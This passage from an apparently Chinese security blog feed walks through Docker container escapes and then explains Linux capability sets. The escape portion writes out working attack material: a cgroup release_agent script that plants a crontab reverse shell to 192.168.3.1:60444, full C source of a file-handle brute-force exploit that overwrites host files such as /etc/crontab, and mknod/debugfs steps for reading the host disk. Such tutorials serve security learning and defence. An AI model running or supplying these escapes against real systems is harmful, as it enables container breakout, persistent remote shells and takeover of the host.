class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/9.png"></p><h6 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h6><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">依旧注意点如下：1、对cgroup有写权限，notify_on_release为12、能够获得宿主机路径并容器中可在这个路径写入文件、执行文件<span class="token punctuation">(</span>release_agent文件中对应路径的文件<span class="token punctuation">)</span>cgroup_dir=<span class="token operator">/</span>sys<span class="token operator">/</span>fs<span class="token operator">/</span>cgroup<span class="token operator">/</span>rdma <span class="token comment"># 选择一个包含release_agent的cgroup子系统控制器，默认只有rdma合适，可以使用cgroup_dir=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`进行查找和定位</span>mkdir <span class="token operator">-</span>p <span class="token variable">$cgroup_dir</span><span class="token operator">/</span>test_subsystem  <span class="token comment"># 在其中创建一个子系统test_subsystem</span><span class="token function">echo</span> 1 ><span class="token variable">$cgroup_dir</span><span class="token operator">/</span>test_subsystem<span class="token operator">/</span>notify_on_release  <span class="token comment"># 将test_subsystem子系统中的notify_on_release配置为1用来在全部进程都退出该cgroup子系统后触发内核调用release_agent</span>host_overlay2_fs_dir=`sed <span class="token operator">-</span>n <span class="token string">'s/.*\upperdir=\([^,]*\).*/\1/p'</span> <span class="token operator">/</span>etc<span class="token operator">/</span>mtab` <span class="token comment"># 从/etc/mtab中提取upperdir,此路径指向宿主机的Overlay2fs文件系统的挂载点，容器内rootfs未提交的文件变动都会在此体现</span><span class="token comment"># 不同存储可参考https://www.anquanke.com/post/id/256304#h3-7</span><span class="token function">echo</span> <span class="token string">'#!/bin/sh'</span> > <span class="token operator">/</span>script <span class="token comment"># 在容器根目录下创建script文件并写入执行脚本(Payload)</span><span class="token function">echo</span> <span class="token string">"touch /testtest"</span> >> <span class="token operator">/</span>script  <span class="token function">echo</span> <span class="token string">'echo "* * * * * root bash -i >&amp;  /dev/tcp/192.168.3.1/60444  0>&amp;1\n" >> /etc/crontab'</span> >> <span class="token operator">/</span>script  <span class="token comment"># 在容器根目录下创建script文件并写入执行脚本(Payload)</span><span class="token function">echo</span> <span class="token string">"<span class="token variable">$host_overlay2_fs_dir</span>/script"</span> > <span class="token variable">$cgroup_dir</span><span class="token operator">/</span>release_agent  <span class="token comment"># 将host_overlay2_fs_dir与script目录拼接，目的是在notify_on_release运行时指向容器外的宿主机中的script文件</span>chmod a<span class="token operator">+</span>x <span class="token operator">/</span>script  <span class="token comment"># 给script增加执行权限</span>sh <span class="token operator">-</span>c <span class="token string">"echo \$\$ > <span class="token variable">$cgroup_dir</span>/test_subsystem/cgroup.procs"</span>  <span class="token comment"># 将一个执行即退出的进程ID写入到此cgroup子系统的cgroup.procs中去触发notify_on_release，在这里写入的是sh进程自己的PID</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/10.png"></p><h6 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h6><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">cdk利用<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/11.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">宿主机内文件如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/12.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">命令执行同理<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/13.png"></p><h5 id="devices-allow重写"><a href="#devices-allow重写" class="headerlink" title="devices.allow重写"></a>devices.allow重写</h5><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">devices子系统用于配置允许或组织cgroup中的task访问某个设备吗，起到黑白名单作用，主要包含如下：  devices<span class="token punctuation">.</span>allow：cgroup中的task能够访问的设备列表，格式为<span class="token function">type</span> major:minor access<span class="token function">type</span>表示类型<span class="token punctuation">,</span>可以为 a<span class="token punctuation">(</span>all<span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">,</span> b<span class="token punctuation">(</span>block）major:minor代表设备编号，两个标号都可以用代替表示所有，比如:<span class="token operator">*</span>代表所有的设备accss表示访问方式，可以为r<span class="token punctuation">(</span>read<span class="token punctuation">)</span><span class="token punctuation">,</span>w<span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">)</span><span class="token punctuation">,</span> m<span class="token punctuation">(</span>mknod<span class="token punctuation">)</span>的组合devices<span class="token punctuation">.</span>deny：cgroup中任务不能访问的设备devices<span class="token punctuation">.</span>list：列出cgroup中设备的黑名单和白名单利用过程：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/14.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">进步反弹shell同理<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/15.png"></p><h4 id="cap-sys-ptrace利用"><a href="#cap-sys-ptrace利用" class="headerlink" title="cap_sys_ptrace利用"></a>cap_sys_ptrace利用</h4><pre class="line-numbers language-none"><code class="language-none">如果有cap_sys_ptrace的cap就可以使用ptrace的特权，有这个特权可以对其他进程进行调试或者进程注入由于namespace的存在，无法直接访问到宿主机的pid。因此这里一般需要容器的pid namespace使用宿主机的逃逸条件：容器有cap_sys_ptrace权限容器和宿主机公用piod namespace (--pid&#x3D;host)没有apparmor保护确认特权如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/16.png"></p><pre class="line-numbers language-none"><code class="language-none">进步进行宿主机进程注入，效果如下https:&#x2F;&#x2F;github.com&#x2F;0x00pf&#x2F;0x00sec_code&#x2F;blob&#x2F;master&#x2F;mem_inject&#x2F;infect.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/17.png"></p><h4 id="cap-dac-read-search利用"><a href="#cap-dac-read-search利用" class="headerlink" title="cap_dac_read_search利用"></a>cap_dac_read_search利用</h4><pre class="line-numbers language-none"><code class="language-none">需要root用户，能够读取宿主机中敏感文件，主要是授予进程调用open_by_handle_at函数，任何具备CAP_DAC_READ_SEARCH该特权的进程都可以利用该函数来访问任意文件函数结构如下：int open_by_handle_at(int mount_fd, struct file_handle *handle, int flags);利用exp，编译后利用如下http:&#x2F;&#x2F;stealth.openwall.net&#x2F;xSports&#x2F;shocker.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/18.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/19.png"></p><pre class="line-numbers language-none"><code class="language-none">其他同理<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/20.png"></p><h4 id="cap-dac-override利用"><a href="#cap-dac-override利用" class="headerlink" title="cap_dac_override利用"></a>cap_dac_override利用</h4><pre class="line-numbers language-none"><code class="language-none">该特权可以绕过文件读、写、执行权限的检查，通过CAP_DAC_READ_SEARCH+CAP_DAC_OVERRIDE的方式对系统文件进行读写从而进步获取权限exp如下，利用同cap_dac_read_search相仿#include &lt;stdio.h&gt;#include &lt;sys&#x2F;types.h&gt;#include &lt;sys&#x2F;stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;dirent.h&gt;#include &lt;stdint.h&gt;&#x2F;&#x2F; gcc write.c -o write.o&#x2F;&#x2F; .&#x2F;write.o &#x2F;etc&#x2F;crontab &#x2F;tmp&#x2F;crontab&#x2F;&#x2F;           目标文件  容器文件struct my_file_handle &#123;  unsigned int handle_bytes;  int handle_type;  unsigned char f_handle[8];&#125;;void die(const char * msg) &#123;  perror(msg);  exit(errno);&#125;void dump_handle(const struct my_file_handle * h) &#123;  fprintf(stderr, &quot;[*] #&#x3D;%d, %d, char nh[] &#x3D; &#123;&quot;, h -&gt; handle_bytes,    h -&gt; handle_type);  for (int i &#x3D; 0; i &lt; h -&gt; handle_bytes; ++i) &#123;    fprintf(stderr, &quot;0x%02x&quot;, h -&gt; f_handle[i]);    if ((i + 1) % 20 &#x3D;&#x3D; 0)      fprintf(stderr, &quot;\n&quot;);    if (i &lt; h -&gt; handle_bytes - 1)      fprintf(stderr, &quot;, &quot;);  &#125;  fprintf(stderr, &quot;&#125;;\n&quot;);&#125; int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)&#123;  int fd;  uint32_t ino &#x3D; 0;  struct my_file_handle outh &#x3D; &#123;    .handle_bytes &#x3D; 8,    .handle_type &#x3D; 1  &#125;;  DIR * dir &#x3D; NULL;  struct dirent * de &#x3D; NULL;  path &#x3D; strchr(path, &#39;&#x2F;&#39;);  &#x2F;&#x2F; recursion stops if path has been resolved  if (!path) &#123;    memcpy(oh -&gt; f_handle, ih -&gt; f_handle, sizeof(oh -&gt; f_handle));    oh -&gt; handle_type &#x3D; 1;    oh -&gt; handle_bytes &#x3D; 8;    return 1;  &#125;  ++path;  fprintf(stderr, &quot;[*] Resolving &#39;%s&#39;\n&quot;, path);  if ((fd &#x3D; open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) &lt; 0)    die(&quot;[-] open_by_handle_at&quot;);  if ((dir &#x3D; fdopendir(fd)) &#x3D;&#x3D; NULL)    die(&quot;[-] fdopendir&quot;);  for (;;) &#123;    de &#x3D; readdir(dir);    if (!de)      break;    fprintf(stderr, &quot;[*] Found %s\n&quot;, de -&gt; d_name);    if (strncmp(de -&gt; d_name, path, strlen(de -&gt; d_name)) &#x3D;&#x3D; 0) &#123;      fprintf(stderr, &quot;[+] Match: %s ino&#x3D;%d\n&quot;, de -&gt; d_name, (int) de -&gt; d_ino);      ino &#x3D; de -&gt; d_ino;      break;    &#125;  &#125;  fprintf(stderr, &quot;[*] Brute forcing remaining 32bit. This can take a while...\n&quot;);  if (de) &#123;    for (uint32_t i &#x3D; 0; i &lt; 0xffffffff; ++i) &#123;      outh.handle_bytes &#x3D; 8;      outh.handle_type &#x3D; 1;      memcpy(outh.f_handle, &amp; ino, sizeof(ino));      memcpy(outh.f_handle + 4, &amp; i, sizeof(i));      if ((i % (1 &lt;&lt; 20)) &#x3D;&#x3D; 0)        fprintf(stderr, &quot;[*] (%s) Trying: 0x%08x\n&quot;, de -&gt; d_name, i);      if (open_by_handle_at(bfd, (struct file_handle * ) &amp; outh, 0) &gt; 0) &#123;        closedir(dir);        close(fd);        dump_handle( &amp; outh);        return find_handle(bfd, path, &amp; outh, oh);      &#125;    &#125;  &#125;  closedir(dir);  close(fd);  return 0;&#125;int main(int argc, char * argv[]) &#123;  char buf[0x1000];  int fd1, fd2;  struct my_file_handle h;  struct my_file_handle root_h &#x3D; &#123;    .handle_bytes &#x3D; 8,    .handle_type &#x3D; 1,    .f_handle &#x3D; &#123;      0x02,      0,      0,      0,      0,      0,      0,      0    &#125;  &#125;;  read(0, buf, 1);  &#x2F;&#x2F; get a FS reference from something mounted in from outside  if ((fd1 &#x3D; open(&quot;&#x2F;etc&#x2F;hosts&quot;, O_RDONLY)) &lt; 0)    die(&quot;[-] open&quot;);      if (find_handle(fd1, argv[1], &amp; root_h, &amp; h) &lt;&#x3D; 0)    die(&quot;[-] Cannot find valid handle!&quot;);  fprintf(stderr, &quot;[!] Got a final handle!\n&quot;);  dump_handle( &amp; h);  if ((fd2 &#x3D; open_by_handle_at(fd1, (struct file_handle * ) &amp; h, O_RDWR)) &lt; 0)    die(&quot;[-] open_by_handle&quot;);  char * line &#x3D; NULL;  size_t len &#x3D; 0;  FILE * fptr;  ssize_t read;  fptr &#x3D; fopen(argv[2], &quot;r&quot;);  while ((read &#x3D; getline( &amp; line, &amp; len, fptr)) !&#x3D; -1) &#123;    write(fd2, line, read);  &#125;  printf(&quot;Success!!\n&quot;);  close(fd2);  close(fd1);  return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="lxcfs-cgroup配置利用"><a href="#lxcfs-cgroup配置利用" class="headerlink" title="lxcfs cgroup配置利用"></a>lxcfs cgroup配置利用</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">lxcfs是一个开源的用户态文件系统，支持lxc容器，也支持docker容器，实现对容器的资源限制提升容器中的资源可见性在容器中提供下列procfs文件<span class="token operator">/</span>proc<span class="token operator">/</span>cpuinfo<span class="token operator">/</span>proc<span class="token operator">/</span>diskstats<span class="token operator">/</span>proc<span class="token operator">/</span>meminfo<span class="token operator">/</span>proc<span class="token operator">/</span>stat<span class="token operator">/</span>proc<span class="token operator">/</span>swaps<span class="token operator">/</span>proc<span class="token operator">/</span>uptime示意图如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/21.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">如将宿主机的<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>lxcfs<span class="token operator">/</span>proc<span class="token operator">/</span>meminfo文件挂载到了docker容器中的<span class="token operator">/</span>proc<span class="token operator">/</span>meminfo后，容器进程读取相关文件内容时，lxcfs的fuse能够实现从容器对应的cgroup读取证券的内存限制，从而使得应用获得正确的限制【fuse，Filesystem in Userspace，一个用户空间文件框架，提供一组用于实现一个文件系统的api，使得可以在用户态实现自己的文件系统】部署完lxcfs，容器内启动如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/22.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">利用前提：pod挂载了lxcfs目录包含cgroup目录并具备写权限查看挂载情况<span class="token function">mount</span> <span class="token punctuation">|</span> grep lxcfs<span class="token function">ls</span> <span class="token operator">-</span>al <span class="token operator">/</span>tmp<span class="token operator">/</span>lxcfs<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/23.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">设置容器允许访问所有类型设备<span class="token function">echo</span> a > <span class="token operator">/</span>tmp<span class="token operator">/</span>lxcfs<span class="token operator">/</span>cgroup<span class="token operator">/</span>devices<span class="token operator">/</span>docker<span class="token operator">/</span>0a7bce2877faa6696757bec31824e5d72e0d7fa2332d684090baea73c8dbff0f<span class="token operator">/</span>devices<span class="token punctuation">.</span>allow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/24.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">获取etc目录的node号<span class="token function">cat</span> <span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>mountinfo <span class="token punctuation">|</span> grep etc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/25.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">创建设备 设备名称、块类型设备、主设备号、次设备号mknod etctest  b 8 1 调试设备debugfs <span class="token operator">-</span>w etctest进步权限证明如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/26.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/27.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">cdk同理可利用<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/docker4/28.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudSecurity </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Capabilities机制</title>
      <link href="2022/04/15/capabilities-ji-zhi/"/>
      <url>2022/04/15/capabilities-ji-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">linux是一种安全的操作系统，将系统权限都赋予了一个单一root，只给普通用户保留需要的权限，root可以安装、修改等服务、管理用户等作为普通用户如果需要执行某些只有管理员才能进行的操作时，有两种方法可以实现：sudo或SUID管控，sudo比较常规SUID，如passwd，修改密码时候是需要root的权限，但普通用户却可以通过这个来修改密码，这是因为<span class="token operator">/</span>bin<span class="token operator">/</span>passwd被设置了SUID标识所以普通用户执行passwd时，进程的owner就是passwd的所有者也就是root，运行周期内有root权限，一旦被漏洞利用将直接导致权限获取此处SUID通常只需要一部分特权，但SUID提供了所有的root权限，所以SUID就存在了较大安全隐患，为了更加细颗粒度的进行控制，linux在内核2<span class="token punctuation">.</span>2引入了一种叫做capabilities机制将之前与root（uid=0）关联的特权细化分成为不同的功能组，本身作为线程的属性存在，每个功能组都可以独立启用和禁用，本质是将内核调用分门别类，具备相同功能的内核调用被放到同个组中这么一来权限检查就变成了：如果身份不是root，就去检查是否具备该特权对应的Capabilities查看cap_effective对应位是否有效，以此决定是否可以执行特权操作，而不是单独检查进程的有效UID是否为0；Capabilities可以在进程执行时赋予，也可以从父进程去继承<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Capabilities表"><a href="#Capabilities表" class="headerlink" title="Capabilities表"></a><strong>Capabilities表</strong></h2><table><thead><tr><th>CAP_AUDIT_CONTROL</th><th>启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</th></tr></thead><tbody><tr><td>CAP_AUDIT_READ</td><td>允许通过 multicast netlink 套接字读取审计日志</td></tr><tr><td>CAP_AUDIT_WRITE</td><td>将记录写入内核审计日志</td></tr><tr><td>CAP_BLOCK_SUSPEND</td><td>使用可以阻止系统挂起的特性</td></tr><tr><td>CAP_BPF (5.8)</td><td>从CAP_SYS_ADMIN分离一部分BFP功能，控制了一些BPF特定的操作，包括创建BPF maps、使用一些高级的BPF程序功能、访问BPF type format（BTF）数据等</td></tr><tr><td>CAP_CHECKPOINT_RESTORE (5.9)</td><td>允许更新/proc/sys/kernel/ns_last_pid，使用set_tid特性，读其他进程的/proc/[pid]/map_files</td></tr><tr><td>CAP_CHOWN</td><td>修改文件所有者的权限</td></tr><tr><td>CAP_DAC_OVERRIDE</td><td>忽略文件的 DAC 访问限制</td></tr><tr><td>CAP_DAC_READ_SEARCH</td><td>忽略文件读及目录搜索的 DAC 访问限制</td></tr><tr><td>CAP_FOWNER</td><td>忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td></tr><tr><td>CAP_FSETID</td><td>允许设置文件的 setuid 位</td></tr><tr><td>CAP_IPC_LOCK</td><td>允许锁定共享内存片段</td></tr><tr><td>CAP_IPC_OWNER</td><td>忽略 IPC 所有权检查</td></tr><tr><td>CAP_KILL</td><td>允许对不属于自己的进程发送信号</td></tr><tr><td>CAP_LEASE</td><td>允许修改文件锁的 FL_LEASE 标志</td></tr><tr><td>CAP_LINUX_IMMUTABLE</td><td>允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td></tr><tr><td>CAP_MAC_ADMIN</td><td>允许 MAC 配置或状态更改</td></tr><tr><td>CAP_MAC_OVERRIDE</td><td>忽略文件的 DAC 访问限制</td></tr><tr><td>CAP_MKNOD</td><td>允许使用 mknod() 系统调用</td></tr><tr><td>CAP_NET_ADMIN</td><td>允许执行网络管理任务</td></tr><tr><td>CAP_NET_BIND_SERVICE</td><td>允许绑定到小于 1024 的端口</td></tr><tr><td>CAP_NET_BROADCAST</td><td>允许网络广播和多播访问</td></tr><tr><td>CAP_NET_RAW</td><td>允许使用原始套接字</td></tr><tr><td>CAP_PERFMON (5.8)</td><td>管理性能监控task</td></tr><tr><td>CAP_SETGID</td><td>允许改变进程的 GID</td></tr><tr><td>CAP_SETFCAP</td><td>允许为文件设置任意的 capabilities</td></tr><tr><td>CAP_SETPCAP</td><td>允许设置其他进程的 capabilities</td></tr><tr><td>CAP_SETUID</td><td>允许改变进程的 UID</td></tr><tr><td>CAP_SYS_ADMIN</td><td>允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td></tr><tr><td>CAP_SYS_BOOT</td><td>允许重新启动系统</td></tr><tr><td>CAP_SYS_CHROOT</td><td>允许使用 chroot() 系统调用</td></tr><tr><td>CAP_SYS_MODULE</td><td>允许插入和删除内核模块</td></tr><tr><td>CAP_SYS_NICE</td><td>允许提升优先级及设置其他进程的优先级</td></tr><tr><td>CAP_SYS_PACCT</td><td>允许执行进程的 BSD 式审计</td></tr><tr><td>CAP_SYS_PTRACE</td><td>允许跟踪任何进程</td></tr><tr><td>CAP_SYS_RAWIO</td><td>允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td></tr><tr><td>CAP_SYS_RESOURCE</td><td>忽略资源限制</td></tr><tr><td>CAP_SYS_TIME</td><td>允许改变系统时钟</td></tr><tr><td>CAP_SYS_TTY_CONFIG</td><td>允许配置 TTY 设备</td></tr><tr><td>CAP_SYSLOG</td><td>允许使用 syslog() 系统调用</td></tr><tr><td>CAP_WAKE_ALARM</td><td>允许触发一些能唤醒系统的东西(比如 CLOCK_BOOTTIME_ALARM 计时器)</td></tr></tbody></table><h2 id="Capabilities的赋予和继承"><a href="#Capabilities的赋予和继承" class="headerlink" title="Capabilities的赋予和继承"></a>Capabilities的赋予和继承</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">linux的Capabilities分为进程Capabilities和文件Capabilities，对于进程来说，Capabilities是细分到了线程的，每个线程都可以有自己的Capabilities，对文件来说，Capabilities保存在文件的扩展属性<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="线程Capabilities"><a href="#线程Capabilities" class="headerlink" title="线程Capabilities"></a>线程Capabilities</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">每个线程都有5个Capabilities集合，集合使用64位掩码，显示16进制格式，5个Capabilities集合分别是：PermittedEffectiveInheritableBoundingAmbient<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Permitted"><a href="#Permitted" class="headerlink" title="Permitted"></a>Permitted</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">定义了线程能够使用的Capabilities上限。线程可以通过系统调用 capset 来从Effective或Inheritable集合中添加或删除Capabilities，前提是添加或删除的Capabilities必须在Permitted集合中如果某个线程想向Inheritable集合中添加或删除Capabilities，首先他的Effective必须包含CAP_SETPCAP这个Capability<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Effective"><a href="#Effective" class="headerlink" title="Effective"></a>Effective</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">内核检查线程是否可以进行特权操作时，检查的对象是Effective集合已知Permitted定义了上线，线程可以删除Effective集合中的某Capabilities，随后在需要的时候在从Permitted集合中恢复该Capabilities，以此达到临时禁用的目的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="Inheritable"><a href="#Inheritable" class="headerlink" title="Inheritable"></a>Inheritable</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">当执行 exec 系统调用的时候，能够被新的可执行文件集成的Capabilities被包含在Inheritable集合中包含在该集合中的Capabilities并不会自动集成给信的可执行文件，不会添加到新线程的Effective中，只会影响线程的Permitted集合<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="Bounding"><a href="#Bounding" class="headerlink" title="Bounding"></a>Bounding</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">Bounding集合是Inheritable集合的超集，如果某个Capabilities不在Bounding集合中，即使它在Permitted集合中，线程也不能将该Capabilities添加到它的Inheritable集合中Bounding集合的Capabilities在执行 fork 系统调用时会传递给子进程的Bounding 集合，并且在执行 exec 系统调用后保持不变  当某个线程运行时候不能向Bounding集合中添加Capabilities  一旦某个Capabilities被从Bounding集合中删除，则无法被添加回来  将Capabilities从Bounding删除后，之前Inherited集合如果包含该Capabilities则将继续保留，如果后续从Inheritable集合删除了该Capabilities则不能添加回来<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Ambient"><a href="#Ambient" class="headerlink" title="Ambient"></a>Ambient</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在4<span class="token punctuation">.</span>3的内核新增的集合，用来弥补Inheritabl  Permitted和Inheritable未设置的Capabilities，Ambient也不能设置  当Permitted和Inheritable关闭某权限（比如 CAP_SYS_BOOT）后，Ambient也随之关闭对应权限，这样就确保了降低权限后子进程也会降低权限  非特权用户如果在Permitted集合中有一个Capabilities，那么可以添加到 Ambient集合中，这样它的子进程便可以在Ambient、Permitted和Effective集合中获取这个Capabilities  Ambient优势：将CAP_NET_ADMIN添加到当前进程的Ambient集合中，它便可以通过 fork 和 exec 调用shell脚本来执行网络管理任务，因为CAP_NET_ADMIN会自动继承下去<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="文件Capabilities"><a href="#文件Capabilities" class="headerlink" title="文件Capabilities"></a>文件Capabilities</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">保存在文件的扩展属性中，要想修改需要有CAP_SETFCAP权限，文件和线程的Capabilities共同决定了通过 exec 调用运行该文件后线程的Capabilities注意如果不支持文件系统支持，如系统文件使用了nouuid进行挂载，那么Capabilities会被忽略3个集合：PermittedInheritableEffective<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Permitted-1"><a href="#Permitted-1" class="headerlink" title="Permitted"></a>Permitted</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">会与线程的Bounding集合计算交集，然后添加到线程Permitted集合中<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Inheritable-1"><a href="#Inheritable-1" class="headerlink" title="Inheritable"></a>Inheritable</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">与线程的Inheritable集合的交集，会被添加到执行完 exec 后的线程的Permitted 集合中<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Effective-1"><a href="#Effective-1" class="headerlink" title="Effective"></a>Effective</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">这不是一个集合，仅仅是一个标志位。如果设置开启，那么在执行完 exec 后，线程 Permitted集合中的Capabilities会自动添加到它的Effective集合中对于一些旧的可执行文件，由于其不会调用Capabilities相关函数设置自身的 Effective集合，所以可以将可执行文件的Effective 